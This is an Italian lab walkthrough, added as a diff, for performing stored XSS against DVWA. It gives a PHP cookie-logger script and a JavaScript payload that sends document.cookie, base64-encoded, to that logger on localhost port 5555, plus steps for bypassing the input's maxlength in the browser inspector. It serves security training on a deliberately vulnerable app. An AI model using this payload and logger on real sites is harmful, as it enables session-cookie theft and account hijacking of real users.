@@ -1,0 +1,58 @@
+COMANDI ATTACCO XSS LIVELLO LOW E MEDIUM 
+
+Avviare apache2 ==> service apache2 start 
+Andare nella directory ==> /var/www/html
+Creare file log.php==> sudo nano log.php 
+Dentro file log.php inserire ==> 
+<?php
+if(isset($_REQUEST['q'])) {
+    $client_ip = $_SERVER['REMOTE_ADDR'];
+    $decoded_data = base64_decode($_REQUEST['q']);
+
+    if($decoded_data !== false) {
+        $current_timestamp = date('Y-m-d\TH:i:sP');
+
+        $file_path = '/var/www/html/cattura/catturato.txt';
+
+        // Verifica se i dati decodificati sono diversi da false prima di salvare nel file
+        if($decoded_data !== false) {
+            $write_success = file_put_contents($file_path, "IP: $client_ip\nData: $decoded_data\nTimestamp: $current_timestamp\n", FILE_APPEND);
+
+            if($write_success !== false) {
+                echo "I dati sono stati salvati correttamente.";
+            } else {
+                echo "Si è verificato un errore durante il salvataggio dei dati.";
+            }
+        } else {
+            echo "I dati inviati non sono validi.";
+        }
+    } else {
+        echo "I dati inviati non sono validi.";
+    }
+} else {
+    echo "Parametro 'q' mancante nella richiesta.";
+}
+?>
+Creiamo la directory cattura ==> sudo mkdir cattura 
+Entriamo nella directory cattura ==> cd cattura 
+Creiamo il file catturato.txt ==> sudo touch catturato.txt (lo lasciamo vuoto e salviamo)
+Ora diamo tutti i permessi(scrittura-lettura-esecuzione) al file catturato.txt con il comando ==> sudo chown www-data:www-data catturato.txt
+-------------------------------------------------------------------------------------------------------------------------------------------
+Ora entriamo su dvwa nella scheda xss ed inseriamo un name a caso e nel message insrire 
+questo script ==> <script>var i = new Image(); i.src='http://localhost:5555/log.php?q='+btoa(document.cookie)</script>
+pero' per poterlo inserire dobbiamo modificare la max-length dell'input della pagina html:
+quindi facciamo tasto destro sulla pagina xss stored ==> ispeziona ==> barra di ricerca search html ==> scrivere textarea==> 
+dove c'e' doscritto max length aumentare da 50 a 500000 ==> chiudere inspecor e nel campo message inserire <script>var i = new Image(); i.src='http://localhost:5555/log.php?q='+btoa(document.cookie)</script> e cliccare sign guestbook
+Ora aprire una nuova scheda di firefox e nell'url digitare localhost/cattura/catturato.txt e ci dovrebbe apparire il cookie di sessione 
+
+------------------------------------------------------------------------------------------------------------------------------------------
+SPIEGAZIONE DEL CODICE UTILIZZATO 
+
+Il codice php utilizzato ci consente di scrivere all'interno del file catturato il cookie di sessione decodificato in base64. Inoltre lo script e' stato modificato in maniera tale da restituire in output anche la data, l'ora e l'ip.
+Invece il codice javascript utilizzato all'interno del messaggio, crea una finta immagine contenuta nella varibile i che 
+grazie al path impostato come src ci consente di prendere il cookie di sessione grazie alla funzione btoa(document.cookie).
+Nel src di fianco al localhost andiamo volutamente a specificare la porta 5555 in quanto abbiamo modificato la porta di ascolto
+di default, che dalla 80 e' diventata 5555.
+
+
+
